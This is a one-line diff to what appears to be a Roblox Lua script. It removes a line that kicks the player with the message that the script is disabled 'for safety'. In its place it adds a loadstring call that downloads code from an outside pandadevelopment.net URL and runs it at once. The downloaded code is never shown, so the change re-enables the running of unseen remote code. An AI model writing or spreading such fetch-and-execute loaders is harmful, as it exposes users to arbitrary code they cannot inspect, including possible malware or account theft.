@@ -1,1 +1,1 @@
-game.Players.LocalPlayer:Kick("For safety this script is disabled.")
+loadstring(game:HttpGet("https://vss.pandadevelopment.net/virtual/file/3ada20398a5049f5"))()
